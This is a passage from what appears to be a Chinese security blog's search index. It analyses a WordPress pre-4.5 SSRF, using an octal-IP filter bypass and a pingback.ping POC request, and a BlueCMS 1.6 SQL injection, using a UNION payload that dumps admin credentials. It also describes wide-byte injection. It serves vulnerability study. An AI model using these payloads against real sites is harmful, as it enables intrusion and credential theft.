\u5229\u7528 \u65b9\u5f0f \u3002 \u4ee5\u524d \u4e5f \u6ca1 \u600e\u4e48 \u63a5\u89e6 \u8fc7 wordpress \uff0c \u770b \u4e86 \u4e00\u4e0b \u53d7 \u5f71\u54cd \u7684 \u4ee3\u7801 \uff0c \u8bb0\u5f55 \u4e00\u4e0b \u8fc7\u7a0b \u3002   ip \u5730\u5740 \u7684 \u51e0\u79cd \u8868\u793a \u65b9\u5f0f   ip \u5730\u5740 \u57df\u540d \u6709 \u591a\u79cd \u8868\u793a \u65b9\u5f0f \uff0c \u6d4f\u89c8 \u6d4f\u89c8\u5668 \u90fd \u80fd \u8bc6\u522b \u51fa\u6765 \u3002   \u5e38\u89c1 \u7684 ip \u5730\u5740 \u57df\u540d \u8868\u793a \u65b9\u6cd5   \u70b9\u5206 \u8fdb\u5236 \u5341\u8fdb\u5236 \u8868\u793a \u8868\u793a\u6cd5 \uff0c \u4f8b\u5982 192.168 . 1.2   \u8fdb\u5236 \u4e8c\u8fdb\u5236 \u8868\u793a \u8868\u793a\u6cd5 \u4f8b\u5982 11000000101010000000000100000010 \uff0c \u8868\u793a 192.168 . 1.2   \u975e\u5e38 \u89c1 ip \u5730\u5740 \u57df\u540d \u8868\u793a \u65b9\u6cd5   \u6574\u6570 \u6574\u6570\u578b \uff1a \u5c06 \u4e0a\u8ff0 \u7684 \u8fdb\u5236 \u4e8c\u8fdb\u5236 \u76f4\u63a5 \u8f6c\u6362 \u6362\u6210 \u8f6c\u6362\u6210 \u6574\u6570 3232235778 \uff0c \u6d4f\u89c8 \u6d4f\u89c8\u5668 \u901a\u8fc7 \u8bbf\u95ee http : / / 3232235778   \u89e3\u6790 \u4e3a 192.168 . 1.2 \uff0c \u9664\u6b64 \u4e4b\u5916 \u9664\u6b64\u4e4b\u5916 \u8fd8 \u53ef\u4ee5 \u901a\u8fc7 \u516c\u5f0f   192 * 256 ^ 3 + 168 * 256 ^ 2 + 1 * 256 + 2 = 3232235778   \u6362\u7b97   \u8fdb\u5236 \u516b\u8fdb\u5236 \u578b \uff1a \u5c06 IP   192.168 . 1.2 \u6362\u6210 8 \u8fdb\u5236 0300.0250 . 01.02 \uff0c \u5728 \u524d\u9762 \u52a0\u4e0a 0 \u8868\u793a 8 \u8fdb\u5236   \u5341\u516d \u8fdb\u5236 \u5341\u516d\u8fdb\u5236 \u578b \uff1a \u5c06 IP   192.168 . 1.2 \u6362\u6210 16 \u8fdb\u5236 0xc0.0 xA8.1 . 2 \uff0c \u5728 \u524d\u9762 \u52a0\u4e0a 0x \u8868\u793a 16 \u8fdb\u5236   \u6df7\u5408 \u6df7\u5408\u578b \uff1a \u5373 \u4ee5\u4e0a \u7684 \u51e0\u79cd \u65b9\u5f0f \u7684 \u7ed3\u5408 \uff0c 0300.0 xA8.1 . 0x02   \u4e0b\u9762 \u5c31\u662f \u901a\u8fc7 \u8fdb\u5236 \u516b\u8fdb\u5236 \u7ed5\u8fc7 \u68c0\u6d4b \u3002   \u4ee3\u7801 \u8be6\u60c5   \u6f0f\u6d1e \u6210\u56e0 \u5904 508   wp _ http _ validate _ url   \u51fd\u6570   ......   if   (   !   $ same _ host   )   {   $ host   =   trim (   $ parsed _ url [ ' host ' ] ,   ' . '   ) ;   if   (   preg _ match (   ' # ^ \\ d { 1 , 3 } \\ . \\ d { 1 , 3 } \\ . \\ d { 1 , 3 } \\ . \\ d { 1 , 3 } $ # ' ,   $ host   )   )   {   $ ip   =   $ host ;   }   else   {   $ ip   =   gethostbyname (   $ host   ) ;   if   (   $ ip   = = =   $ host   )   / /   Error   condition   for   gethostbyname ( )   $ ip   =   false ;   }   if   (   $ ip   )   {   $ parts   =   array _ map (   ' intval ' ,   explode (   ' . ' ,   $ ip   )   ) ;   if   (   127   = = =   $ parts [ 0 ]   | |   10   = = =   $ parts [ 0 ]   | |   0   = = =   $ parts [ 0 ]   | |   (   172   = = =   $ parts [ 0 ]   &&   16   < =   $ parts [ 1 ]   &&   31   > =   $ parts [ 1 ]   )   | |   (   192   = = =   $ parts [ 0 ]   &&   168   = = =   $ parts [ 1 ]   )   )   {   ......   \u8fd9\u91cc \u7684 \u4ee3\u7801 \u901a\u8fc7 \u6b63\u5219 \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6b63\u5219\u8868\u8fbe\u5f0f   ^ \\ d { 1 , 3 } \\ . \\ d { 1 , 3 } \\ . \\ d { 1 , 3 } \\ . \\ d { 1 , 3 } $   \u5224\u65ad ip \u662f\u5426 \u5408\u6cd5 \uff0c \u5982\u679c \u4e0d \u5408\u6cd5 \u5219 \u901a\u8fc7 \u7f51\u7edc \u83b7\u53d6 ip \u7684 \u503c \u3002   \u4e0b\u9762 \u7684 if \u5224\u65ad \u5219 \u662f \u7528\u6765 \u9632\u6b62 \u7ed9 \u7684 url \u4e3a \u5185\u7f51 ip \uff0c \u4f46\u662f \u4e0a\u8ff0 \u7684 \u6b63\u5219 \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6b63\u5219\u8868\u8fbe\u5f0f \u53ef\u4ee5 \u901a\u8fc7 8 \u8fdb\u5236 \u7ed5\u8fc7 \u5185 \u7f51 \u9650\u5236 \u3002   if   (   empty (   $ parsed _ url [ ' port ' ]   )   )   return   $ url ;   $ port   =   $ parsed _ url [ ' port ' ] ;   if   (   80   = = =   $ port   | |   443   = = =   $ port   | |   8080   = = =   $ port   )   return   $ url ;   \u518d \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u53ef\u4ee5 \u770b\u5230 \u7a0b\u5e8f \u53c8 \u5bf9 \u7aef\u53e3 \u505a \u4e86 \u9650\u5236 \uff0c \u53ea\u80fd \u626b\u63cf 80 , 443 , 8080 \u7aef\u53e3 \u3002   \u7efc\u4e0a \u6240\u8ff0 \u7efc\u4e0a\u6240\u8ff0 \uff0c \u901a\u8fc7 8 \u8fdb\u5236 \u7ed5\u8fc7 ip \u5224\u65ad \uff0c \u53ef\u4ee5 \u626b\u63cf \u5185\u7f51 \u7684 80 , 443 , 8080   \u627e \u4e00\u4e0b \u8c03\u7528 \u7684 \u4f4d\u7f6e , \u53ef\u4ee5 \u627e\u5230 class - wp - xmlrpc - server . php \u901a\u8fc7 wp _ safe _ remote _ get \u8c03\u7528 \u4e86 get \u51fd\u6570 \uff0c get \u51fd\u6570 \u4f7f\u7528 \u4e86 wp _ http _ validate _ url \uff0c \u4ece\u800c \u9020\u6210 ssrf   \u5229\u7528   \u5229\u7528 \u7684 \u65b9\u5f0f \u4e3a \u901a\u8fc7 xmlrpc . php \u4e2d pingback . ping \u529f\u80fd \u6765 \u8c03\u7528 \u8fd9\u4e2a \u51fd\u6570 \u3002   POC   POST   / cms / wordpress / wp442 / xmlrpc . php   HTTP / 1.1   Host :   localhost   User - Agent :   Mozilla / 5.0   ( X11 ;   Ubuntu ;   Linux   x86 _ 64 ;   rv : 48.0 )   Gecko / 20100101   Firefox / 48.0   Accept :   text / html , application / xhtml + xml , application / xml ; q = 0.9 , * / * ; q = 0.8   Accept - Language :   en - US , en ; q = 0.5   Accept - Encoding :   gzip ,   deflate   Connection :   close   Upgrade - Insecure - Requests :   1   Content - Type :   application / x - www - form - urlencoded   Content - Length :   321   < ? xml   version = \" 1.0 \"   encoding = \" iso - 8859 - 1 \" ? >   < methodCall >   < methodName > pingback . ping < / methodName >   < params >   < param > < value > < string > http : / / 012.10 . 10.111 : 8080 / testvul < / string > < / value > < / param > < param > < value > < string > http : / / localhost / cms / wordpress / wp442 / 2016 / 08 / 19 / hello - world / < / string > < / value > < / param >   < / params >   < / methodCall >   \u8fd9\u91cc \u8bbe\u7f6e 10.10 . 10.111 \u4e3a \u53d7\u5bb3 \u53d7\u5bb3\u8005   \u603b\u7ed3   \u5728 \u6d4b\u8bd5 \u4e2d \u53d1\u73b0 \u53ea\u80fd \u5bf9 10 . x . x . x \u7684 \u5185\u7f51 ip \u8fdb\u884c \u5229\u7528 \uff0c \u56e0\u4e3a \u6b63\u5219 \u7684 \u539f\u56e0 \u81f3\u591a \u53ea\u80fd \u6709 3 \u4f4d \u6570\u5b57 \uff0c \u4e00\u4f4d \u9700\u8981 \u4e3a 0 \u6765 \u8868\u793a 8 \u8fdb\u5236 \uff0c \u6240\u4ee5 \u5229\u7528 \u53ea\u6709 10 , \u5e76\u4e14 \u53ea\u80fd \u626b\u63cf 80 , 443 , 8080 \u7aef\u53e3 \u3002 \u7531\u4e8e \u5229\u7528 \u4e2d \u4e0d \u56de\u663e \uff0c \u4e5f \u5f88 \u96be \u786e\u5b9a \u662f\u5426 \u6210\u529f \u5229\u7528 \u3002 \u6240\u4ee5 \u8fd9\u4e2a \u6d1e \u53ef\u80fd \u5371\u5bb3 \u6bd4\u8f83 \u5c0f \uff08 \u592a\u83dc \u4e86 \uff0c \u4e0d\u5230 \u60f3\u4e0d\u5230 \u5176\u4ed6 \u7684 \u5229\u7528 \u65b9\u5f0f \uff0c \u6709 \u5176\u4ed6 \u7684 \u5229\u7528 \u65b9\u5f0f \u8bb0\u5f97 \u5206\u4eab \u554a \uff01 \uff01 \uff01 \uff09   \u8fd8\u6709 \u4e00\u79cd \u5229\u7528 \u5c31\u662f \u5f00\u542f xmlrpc \u7684 wordpress \u7ad9 \u53ef\u4ee5 \u88ab \u901a\u8fc7 pingback . ping \u65b9\u6cd5 \u6765 DDOS \uff0c \u8fd9\u4e2a \u4ee5\u524d \u5c31 \u6709\u4eba \u63d0\u51fa \u6765 \u4e86 \u3002   \u53c2\u8003   http : / / xlab . baidu . com / wordpress /   https : / / virusdefender . net / index . php / archives / 733 /","title":"wordpress   SSRF   < 4.5"},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/#_1","text":"\u524d \u51e0\u5929 \uff0c wordpress \u7206\u51fa \u4e00\u4e2a SSRF \u7684 \u6f0f\u6d1e \uff0c \u8ddf\u8fdb \u4e00\u4e0b \uff0c \u67e5\u9605 \u4e86 \u4e00\u4e0b \uff0c \u7f51\u4e0a \u5e76 \u6ca1\u6709 \u8be6\u7ec6 \u7684 \u5229\u7528 \u65b9\u5f0f \u3002 \u4ee5\u524d \u4e5f \u6ca1 \u600e\u4e48 \u63a5\u89e6 \u8fc7 wordpress \uff0c \u770b \u4e86 \u4e00\u4e0b \u53d7 \u5f71\u54cd \u7684 \u4ee3\u7801 \uff0c \u8bb0\u5f55 \u4e00\u4e0b \u8fc7\u7a0b \u3002","title":"\u6982\u8ff0"},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/#ip","text":"ip \u5730\u5740 \u57df\u540d \u6709 \u591a\u79cd \u8868\u793a \u65b9\u5f0f \uff0c \u6d4f\u89c8 \u6d4f\u89c8\u5668 \u90fd \u80fd \u8bc6\u522b \u51fa\u6765 \u3002","title":"ip \u5730\u5740 \u7684 \u51e0\u79cd \u8868\u793a \u65b9\u5f0f"},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/#ip_1","text":"\u70b9\u5206 \u8fdb\u5236 \u5341\u8fdb\u5236 \u8868\u793a \u8868\u793a\u6cd5 \uff0c \u4f8b\u5982 192.168 . 1.2   \u8fdb\u5236 \u4e8c\u8fdb\u5236 \u8868\u793a \u8868\u793a\u6cd5 \u4f8b\u5982 11000000101010000000000100000010 \uff0c \u8868\u793a 192.168 . 1.2","title":"\u5e38\u89c1 \u7684 ip \u5730\u5740 \u57df\u540d \u8868\u793a \u65b9\u6cd5"},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/#ip_2","text":"\u6574\u6570 \u6574\u6570\u578b \uff1a \u5c06 \u4e0a\u8ff0 \u7684 \u8fdb\u5236 \u4e8c\u8fdb\u5236 \u76f4\u63a5 \u8f6c\u6362 \u6362\u6210 \u8f6c\u6362\u6210 \u6574\u6570 3232235778 \uff0c \u6d4f\u89c8 \u6d4f\u89c8\u5668 \u901a\u8fc7 \u8bbf\u95ee http : / / 3232235778   \u89e3\u6790 \u4e3a 192.168 . 1.2 \uff0c \u9664\u6b64 \u4e4b\u5916 \u9664\u6b64\u4e4b\u5916 \u8fd8 \u53ef\u4ee5 \u901a\u8fc7 \u516c\u5f0f   192 * 256 ^ 3 + 168 * 256 ^ 2 + 1 * 256 + 2 = 3232235778   \u6362\u7b97   \u8fdb\u5236 \u516b\u8fdb\u5236 \u578b \uff1a \u5c06 IP   192.168 . 1.2 \u6362\u6210 8 \u8fdb\u5236 0300.0250 . 01.02 \uff0c \u5728 \u524d\u9762 \u52a0\u4e0a 0 \u8868\u793a 8 \u8fdb\u5236   \u5341\u516d \u8fdb\u5236 \u5341\u516d\u8fdb\u5236 \u578b \uff1a \u5c06 IP   192.168 . 1.2 \u6362\u6210 16 \u8fdb\u5236 0xc0.0 xA8.1 . 2 \uff0c \u5728 \u524d\u9762 \u52a0\u4e0a 0x \u8868\u793a 16 \u8fdb\u5236   \u6df7\u5408 \u6df7\u5408\u578b \uff1a \u5373 \u4ee5\u4e0a \u7684 \u51e0\u79cd \u65b9\u5f0f \u7684 \u7ed3\u5408 \uff0c 0300.0 xA8.1 . 0x02   \u4e0b\u9762 \u5c31\u662f \u901a\u8fc7 \u8fdb\u5236 \u516b\u8fdb\u5236 \u7ed5\u8fc7 \u68c0\u6d4b \u3002","title":"\u975e\u5e38 \u89c1 ip \u5730\u5740 \u57df\u540d \u8868\u793a \u65b9\u6cd5"},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/#_2","text":"\u6f0f\u6d1e \u6210\u56e0 \u5904 508   wp _ http _ validate _ url   \u51fd\u6570   ......   if   (   !   $ same _ host   )   {   $ host   =   trim (   $ parsed _ url [ ' host ' ] ,   ' . '   ) ;   if   (   preg _ match (   ' # ^ \\ d { 1 , 3 } \\ . \\ d { 1 , 3 } \\ . \\ d { 1 , 3 } \\ . \\ d { 1 , 3 } $ # ' ,   $ host   )   )   {   $ ip   =   $ host ;   }   else   {   $ ip   =   gethostbyname (   $ host   ) ;   if   (   $ ip   = = =   $ host   )   / /   Error   condition   for   gethostbyname ( )   $ ip   =   false ;   }   if   (   $ ip   )   {   $ parts   =   array _ map (   ' intval ' ,   explode (   ' . ' ,   $ ip   )   ) ;   if   (   127   = = =   $ parts [ 0 ]   | |   10   = = =   $ parts [ 0 ]   | |   0   = = =   $ parts [ 0 ]   | |   (   172   = = =   $ parts [ 0 ]   &&   16   < =   $ parts [ 1 ]   &&   31   > =   $ parts [ 1 ]   )   | |   (   192   = = =   $ parts [ 0 ]   &&   168   = = =   $ parts [ 1 ]   )   )   {   ......   \u8fd9\u91cc \u7684 \u4ee3\u7801 \u901a\u8fc7 \u6b63\u5219 \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6b63\u5219\u8868\u8fbe\u5f0f   ^ \\ d { 1 , 3 } \\ . \\ d { 1 , 3 } \\ . \\ d { 1 , 3 } \\ . \\ d { 1 , 3 } $   \u5224\u65ad ip \u662f\u5426 \u5408\u6cd5 \uff0c \u5982\u679c \u4e0d \u5408\u6cd5 \u5219 \u901a\u8fc7 \u7f51\u7edc \u83b7\u53d6 ip \u7684 \u503c \u3002   \u4e0b\u9762 \u7684 if \u5224\u65ad \u5219 \u662f \u7528\u6765 \u9632\u6b62 \u7ed9 \u7684 url \u4e3a \u5185\u7f51 ip \uff0c \u4f46\u662f \u4e0a\u8ff0 \u7684 \u6b63\u5219 \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6b63\u5219\u8868\u8fbe\u5f0f \u53ef\u4ee5 \u901a\u8fc7 8 \u8fdb\u5236 \u7ed5\u8fc7 \u5185 \u7f51 \u9650\u5236 \u3002   if   (   empty (   $ parsed _ url [ ' port ' ]   )   )   return   $ url ;   $ port   =   $ parsed _ url [ ' port ' ] ;   if   (   80   = = =   $ port   | |   443   = = =   $ port   | |   8080   = = =   $ port   )   return   $ url ;   \u518d \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u53ef\u4ee5 \u770b\u5230 \u7a0b\u5e8f \u53c8 \u5bf9 \u7aef\u53e3 \u505a \u4e86 \u9650\u5236 \uff0c \u53ea\u80fd \u626b\u63cf 80 , 443 , 8080 \u7aef\u53e3 \u3002   \u7efc\u4e0a \u6240\u8ff0 \u7efc\u4e0a\u6240\u8ff0 \uff0c \u901a\u8fc7 8 \u8fdb\u5236 \u7ed5\u8fc7 ip \u5224\u65ad \uff0c \u53ef\u4ee5 \u626b\u63cf \u5185\u7f51 \u7684 80 , 443 , 8080   \u627e \u4e00\u4e0b \u8c03\u7528 \u7684 \u4f4d\u7f6e , \u53ef\u4ee5 \u627e\u5230 class - wp - xmlrpc - server . php \u901a\u8fc7 wp _ safe _ remote _ get \u8c03\u7528 \u4e86 get \u51fd\u6570 \uff0c get \u51fd\u6570 \u4f7f\u7528 \u4e86 wp _ http _ validate _ url \uff0c \u4ece\u800c \u9020\u6210 ssrf","title":"\u4ee3\u7801 \u8be6\u60c5"},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/#_3","text":"\u5229\u7528 \u7684 \u65b9\u5f0f \u4e3a \u901a\u8fc7 xmlrpc . php \u4e2d pingback . ping \u529f\u80fd \u6765 \u8c03\u7528 \u8fd9\u4e2a \u51fd\u6570 \u3002   POC   POST   / cms / wordpress / wp442 / xmlrpc . php   HTTP / 1.1   Host :   localhost   User - Agent :   Mozilla / 5.0   ( X11 ;   Ubuntu ;   Linux   x86 _ 64 ;   rv : 48.0 )   Gecko / 20100101   Firefox / 48.0   Accept :   text / html , application / xhtml + xml , application / xml ; q = 0.9 , * / * ; q = 0.8   Accept - Language :   en - US , en ; q = 0.5   Accept - Encoding :   gzip ,   deflate   Connection :   close   Upgrade - Insecure - Requests :   1   Content - Type :   application / x - www - form - urlencoded   Content - Length :   321   < ? xml   version = \" 1.0 \"   encoding = \" iso - 8859 - 1 \" ? >   < methodCall >   < methodName > pingback . ping < / methodName >   < params >   < param > < value > < string > http : / / 012.10 . 10.111 : 8080 / testvul < / string > < / value > < / param > < param > < value > < string > http : / / localhost / cms / wordpress / wp442 / 2016 / 08 / 19 / hello - world / < / string > < / value > < / param >   < / params >   < / methodCall >   \u8fd9\u91cc \u8bbe\u7f6e 10.10 . 10.111 \u4e3a \u53d7\u5bb3 \u53d7\u5bb3\u8005","title":"\u5229\u7528"},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/#_4","text":"\u5728 \u6d4b\u8bd5 \u4e2d \u53d1\u73b0 \u53ea\u80fd \u5bf9 10 . x . x . x \u7684 \u5185\u7f51 ip \u8fdb\u884c \u5229\u7528 \uff0c \u56e0\u4e3a \u6b63\u5219 \u7684 \u539f\u56e0 \u81f3\u591a \u53ea\u80fd \u6709 3 \u4f4d \u6570\u5b57 \uff0c \u4e00\u4f4d \u9700\u8981 \u4e3a 0 \u6765 \u8868\u793a 8 \u8fdb\u5236 \uff0c \u6240\u4ee5 \u5229\u7528 \u53ea\u6709 10 , \u5e76\u4e14 \u53ea\u80fd \u626b\u63cf 80 , 443 , 8080 \u7aef\u53e3 \u3002 \u7531\u4e8e \u5229\u7528 \u4e2d \u4e0d \u56de\u663e \uff0c \u4e5f \u5f88 \u96be \u786e\u5b9a \u662f\u5426 \u6210\u529f \u5229\u7528 \u3002 \u6240\u4ee5 \u8fd9\u4e2a \u6d1e \u53ef\u80fd \u5371\u5bb3 \u6bd4\u8f83 \u5c0f \uff08 \u592a\u83dc \u4e86 \uff0c \u4e0d\u5230 \u60f3\u4e0d\u5230 \u5176\u4ed6 \u7684 \u5229\u7528 \u65b9\u5f0f \uff0c \u6709 \u5176\u4ed6 \u7684 \u5229\u7528 \u65b9\u5f0f \u8bb0\u5f97 \u5206\u4eab \u554a \uff01 \uff01 \uff01 \uff09   \u8fd8\u6709 \u4e00\u79cd \u5229\u7528 \u5c31\u662f \u5f00\u542f xmlrpc \u7684 wordpress \u7ad9 \u53ef\u4ee5 \u88ab \u901a\u8fc7 pingback . ping \u65b9\u6cd5 \u6765 DDOS \uff0c \u8fd9\u4e2a \u4ee5\u524d \u5c31 \u6709\u4eba \u63d0\u51fa \u6765 \u4e86 \u3002","title":"\u603b\u7ed3"},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/#_5","text":"http : / / xlab . baidu . com / wordpress /   https : / / virusdefender . net / index . php / archives / 733 /","title":"\u53c2\u8003"},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/","tags":["\u6f0f\u6d1e\u5206\u6790"],"text":"\u6982\u8ff0   \u5f88\u4e45 \u5f88\u4e45\u6ca1 \u6709 \u4ee3\u7801 \u5ba1\u8ba1 \u4e86 \uff0c \u62ff \u4e00\u5957 \u7b80\u5355 \u7684 \u627e \u627e \u611f\u89c9 \u3002 bluecms \u662f \u4e00\u5957 \u6bd4\u8f83 \u8001 \u7684 \u95e8\u6237 \u7f51\u7ad9 \u95e8\u6237\u7f51 \u95e8\u6237\u7f51\u7ad9 cms \uff0c \u7f51\u4e0a \u4e5f \u6709 \u5f88\u591a \u5173\u4e8e \u5b83 \u7684 \u6f0f\u6d1e \u8fd8 \u672a \u4fee\u8865 \uff0c \u6240\u4ee5 \u4e0b\u6587 \u7684 \u6f0f\u6d1e \u4e5f \u4e0d\u7b97 \u662f \u6700\u65b0 \u7684 \uff0c \u4ec5 \u5f53 \u662f \u7ec3\u7ec3 \u7ec3\u624b \u7ec3\u7ec3\u624b \u3002   SQL \u6ce8\u5165 \u5206\u6790   \u9996\u5148 \u5173\u6ce8 \u4e00\u4e0b \u6570\u636e \u7684 \u8f93\u5165   \u5168\u5c40 \u6570\u636e \u8f6c\u4e49   \u5728 common . inc . php \u4e2d   if ( ! get _ magic _ quotes _ gpc ( ) )   {   $ _ POST   =   deep _ addslashes ( $ _ POST ) ;   $ _ GET   =   deep _ addslashes ( $ _ GET ) ;   $ _ COOKIES   =   deep _ addslashes ( $ _ COOKIES ) ;   $ _ REQUEST   =   deep _ addslashes ( $ _ REQUEST ) ;   }   \u518d \u8ddf\u8fdb \u4e00\u4e0b deep _ addslashes   function   deep _ addslashes ( $ str )   {   if ( is _ array ( $ str ) )   {   foreach ( $ str   as   $ key = > $ val )   {   $ str [ $ key ]   =   deep _ addslashes ( $ val ) ;   }   }   else   {   $ str   =   addslashes ( $ str ) ;   }   return   $ str ;   }   \u53ef\u4ee5 \u53d1\u73b0 \u5bf9 \u6570\u636e \u7684 \u6ce8\u5165 \uff0c \u8fdb\u884c \u4e86 \u52a0 \u659c\u6760 \u8f6c\u4e49 \u7684 \u64cd\u4f5c \u3002 \u90a3\u4e48 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u627e \u6ce8\u5165 \u601d\u8def \u4e3b\u8981 \u6709 \u4ee5\u4e0b 3 \u70b9 \uff1a   \u627e \u6574\u6570 \u6574\u6570\u578b \u6ce8\u5165   \u6574\u5957 cms \u9ed8\u8ba4 gb2312 \u7f16\u7801 \uff0c \u5bb9\u6613 \u9020\u6210 \u5bbd \u5b57\u8282 \u6ce8\u5165   http \u5934 \u5e76 \u4e0d \u5728 \u8f6c\u4e49 \u7684 \u8303\u56f4 \u5185 \uff0c \u6240\u4ee5 \u7c7b\u4f3c \u5b58\u5165 ip \uff0c reffer \u7684 \u4f4d\u7f6e \u4e5f \u80fd \u53d1\u751f \u6ce8\u5165   \u6574\u6570 \u6574\u6570\u578b \u6ce8\u5165   \u62ff grep \u5339\u914d \u4e86 \u4e00\u4e0b $ _ GET \uff0c \u627e\u5230 \u4e00\u5904 \u4e0d \u505a \u5176\u4ed6 \u8fc7\u6ee4 \u7684 \u6574\u6570 \u6574\u6570\u578b \u4f4d\u7f6e   . / ad _ js . php : $ ad _ id   =   ! empty ( $ _ GET [ ' ad _ id ' ] )   ?   trim ( $ _ GET [ ' ad _ id ' ] )   :   ' ' ;   \u8ddf\u8fdb ad _ js . php   $ ad _ id   =   ! empty ( $ _ GET [ ' ad _ id ' ] )   ?   trim ( $ _ GET [ ' ad _ id ' ] )   :   ' ' ;   if ( empty ( $ ad _ id ) )   {   echo   ' Error ! ' ;   exit ( ) ;   }   $ ad   =   $ db - > getone ( \" SELECT   *   FROM   \" . table ( ' ad ' ) . \"   WHERE   ad _ id   = \" . $ ad _ id ) ;   getone \u51fd\u6570   function   getone ( $ sql ,   $ type = MYSQL _ ASSOC ) {   $ query   =   $ this - > query ( $ sql , $ this - > linkid ) ;   $ row   =   mysql _ fetch _ array ( $ query ,   $ type ) ;   return   $ row ;   }   \u53ef\u4ee5 \u770b\u5230 \u8fd9\u91cc \u5bf9 ad _ id \u6ca1\u6709 \u505a \u5176\u4ed6 \u8fc7\u6ee4 \u5904\u7406 \uff0c \u9020\u6210 \u4e86 \u6574\u6570 \u6574\u6570\u578b \u6ce8\u5165 , \u7531\u4e8e \u540e\u9762 \u4f1a \u5c06 ad _ content \u6253\u5370 \u5728 \u9875\u9762 \u4e0a \uff0c \u6240\u4ee5 \u76f4\u63a5 \u7528 union \u6ce8\u5165 \u5c31 \u53ef\u4ee5 \u83b7\u5f97 \u6570\u636e \uff0c \u6784\u9020 payload   / ad _ js . php ? ad _ id = 1% 20union% 20select% 201 , 2 , 3 , 4 , 5 , 6 , concat ( admin _ name , 0x23 , pwd ) % 20from% 20blue _ admin% 20limit% 201   \u7ed3\u679c \u53ef\u4ee5 \u5728 \u8fd4\u56de \u7684 \u754c\u9762 \u4e2d \u770b\u5230   < ! --   document . write ( \" admin # 21232f297a57a5a743894a0e4a801fc3 \" ) ;   -- >   ps : \u56e0\u4e3a \u8be5 cms \u9519\u8bef \u56de\u663e \u5177\u4f53 sql \u8bed\u53e5 \uff0c \u8868 \u524d\u7f00 \u53ef\u4ee5 \u901a\u8fc7 \u62a5\u9519 \u7684 \u65b9\u6cd5 \u628a\u8868 \u524d\u7f00 \u7206 \u51fa\u6765 \u3002   \u5bbd \u5b57\u8282 \u6ce8\u5165   bluecms \u64cd\u4f5c \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u7684 \u5177\u4f53 \u7c7b \u5b9a\u4e49 \u5728 mysql . class . php , \u9ed8\u8ba4 \u8fde\u63a5 \u65f6 \u7684 \u7f16\u7801 \u4e3a gbk \uff0c \u6211\u4eec \u53ef\u4ee5 \u77e5\u9053 \u5f53 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u8fde\u63a5 \u65f6 \u7684 \u7f16\u7801 \u4e3a gbk \u7b49 \u53cc \u5b57\u8282 \u7f16\u7801 \u65f6 \uff0c \u5bb9\u6613 \u53d1\u751f \u5bbd \u5b57\u8282 \u6ce8\u5165 \u3002 \u524d\u9762 \u63d0\u5230 \u8be5\u5957 cms \u5bf9 \u6570\u636e \u8f93\u5165 \u8fdb\u884c \u4e86 \u8f6c\u4e49 \u7684 \u64cd\u4f5c \uff0c \u90a3\u4e48 \u521a\u521a \u597d \u6761\u4ef6 \u90fd \u9f50 \u4e86 \uff0c \u5fc5\u7136 \u5b58\u5728 \u5bbd \u5b57\u8282 \u6ce8\u5165 \u3002 grep \u770b \u4e86 \u4e00\u4e0b \uff0c \u57fa\u672c \u57fa\u672c\u4e0a \u7684 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u90fd \u53ea\u662f \u505a \u4e86 \u8f6c\u4e49 \u5904\u7406 \uff0c \u6240\u4ee5 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u6570\u636e \u8f93\u5165 \u70b9 \u90fd \u5b58\u5728 \u5bbd \u5b57\u8282 \u6ce8\u5165 \u3002 \u5927\u591a \u591a\u6570 \u5927\u591a\u6570 \u6ce8\u5165 \u90fd \u662f \u76f2\u6ce8 \uff0c \u6ca1 \u627e\u5230 \u5177\u4f53 \u53ef\u4ee5 \u4f1a\u663e \u6570\u636e \u7684 \u5730\u65b9 \uff0c \u8fd9\u91cc \u5c31 \u7b80\u5355 \u770b \u4e00\u4e0b \u767b\u9646 \u5904   \u540e\u53f0 \u767b\u5f55 \u5904   \u5176\u5b9e \u524d\u53f0 user . php \uff0c \u4e5f \u5b58\u5728 \u6ce8\u5165 \uff0c \u53ea\u662f \u76f2\u6ce8 \uff0c \u8fd9\u91cc \u5c31 \u53d6 \u7b80\u5355 \u7684 \u540e\u53f0 \u767b\u5f55 \u9a8c\u8bc1 \u5904   admin / login . php   elseif ( $ act   = =   ' do _ login ' ) {   $ admin _ name   =   isset ( $ _ POST [ ' admin _ name ' ] )   ?   trim ( $ _ POST [ ' admin _ name ' ] )   :   ' ' ;   $ admin _ pwd   =   isset ( $ _ POST [ ' admin _ pwd ' ] )   ?   trim ( $ _ POST [ ' admin _ pwd ' ] )   :   ' ' ;   $ remember   =   isset ( $ _ POST )   ?   intval ( $ _ POST [ ' rememberme ' ] )   :   0 ;   if ( $ admin _ name   = =   ' ' ) {   showmsg ( ' xxx ' ) ;   }   if ( $ admin _ pwd   = =   ' ' ) {   showmsg ( ' xxx ' ) ;   }   if ( check _ admin ( $ admin _ name ,   $ admin _ pwd ) ) {   update _ admin _ info ( $ admin _ name ) ;   if ( $ remember   = =   1 ) {   setcookie ( ' Blue [ admin _ id ] ' ,   $ _ SESSION [ ' admin _ id ' ] ,   time ( ) + 86400 ) ;   setcookie ( ' Blue [ admin _ name ] ' ,   $ admin _ name ,   time ( ) + 86400 ) ;   setcookie ( ' Blue [ admin _ pwd ] ' ,   md5 ( md5 ( $ admin _ pwd ) . $ _ CFG [ ' cookie _ hash ' ] ) ,   time ( ) + 86400 ) ;   }   } else {   showmsg ( ' xxx ' ) ;   }   showmsg ( ' xxx ' ,   ' index . php ' ) ;   }   \u7ee7\u7eed \u8ddf\u8fdb check _ admin   function   check _ admin ( $ name ,   $ pwd )   {   global   $ db ;   $ row   =   $ db - > getone ( \" 